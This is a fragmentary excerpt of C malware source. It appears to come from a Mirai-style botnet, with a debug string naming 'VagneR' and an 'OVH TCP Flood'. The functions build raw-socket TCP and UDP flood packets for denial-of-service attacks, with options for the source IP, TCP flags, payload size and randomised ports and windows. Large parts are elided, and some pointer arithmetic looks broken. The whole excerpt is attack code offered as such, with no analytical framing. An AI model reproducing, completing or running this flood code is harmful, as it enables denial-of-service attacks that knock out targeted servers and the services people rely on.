...
#define MAX_PACKET_SIZE (sizeof(struct iphdr) + sizeof(struct tcphdr) + MAX_DATA_SIZE)
...
void attack_handshake(uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts)
{
    int i, rfd;
...
void attack_udphex(uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts)
{
    int i;
    char **pkts = calloc(targs_len, sizeof (char *));
    int *fds = calloc(targs_len, sizeof (int));
...
void attack_tcpsack(uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts)
{
        #ifdef DEBUG
    printf("[VagneR] Launching OVH TCP Flood\n");
    #endif
    int i, fd;
    char **pkts = calloc(targs_len, sizeof (char *));
    uint8_t ip_tos = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_TOS, 0);
...
void attack_tcppsh(uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts)
{
    int i, fd;
    char **pkts = calloc(targs_len, sizeof (char *));
    uint8_t ip_tos = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_TOS, 0);
    ...
    BOOL syn_fl = attack_get_opt_int(opts_len, opts, ATK_OPT_SYN, FALSE);
    BOOL fin_fl = attack_get_opt_int(opts_len, opts, ATK_OPT_FIN, FALSE);
    int data_len = attack_get_opt_int(opts_len, opts, ATK_OPT_PAYLOAD_SIZE, 1458);
    BOOL data_rand = attack_get_opt_int(opts_len, opts, ATK_OPT_PAYLOAD_RAND, TRUE);
    uint32_t source_ip = attack_get_opt_ip(opts_len, opts, ATK_OPT_SOURCE, LOCAL_ADDR);
    if ((fd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP)) == -1)
    {
    ...
    // payload sended to dest server
        ...
        pkts[i] = calloc(1458, sizeof (char));
        iph = (struct iphdr *)pkts[i];
        tcph = (struct tcphdr *)(iph + 1);
        payload = (char *)(tcph + 124);
        iph->version = 4;
        iph->ihl = 5;
        iph->tos = ip_tos;
        iph->tot_len = htons(sizeof (struct iphdr) + sizeof (struct tcphdr) + data_len);
        ...
        // window size get randomized (0, 65535)

        tcph->window = rand() % 65535;
    }
...
void attack_udp_custom(uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts)
{
    ...
    {
        //myb
        sport = htons(1024 + rand_next() % (65535 - 1024));
    } else {
        sport = htons(sport);
    }
    ...
    for (i = 0; i < targs_len; i++)
    {
        ...
        {
#ifdef DEBUG
            printf("[attack/cudp]: failed to create udp socket. Aborting attack\n");
#endif
            return;
        }
        ...
        {
#ifdef DEBUG
            printf("[attack/cudp]: failed to bind udp socket.\n");
#endif
        }
        ...
        {
#ifdef DEBUG
            printf("[attack/cudp]: failed to connect udp socket.\n");
#endif
        }
    }
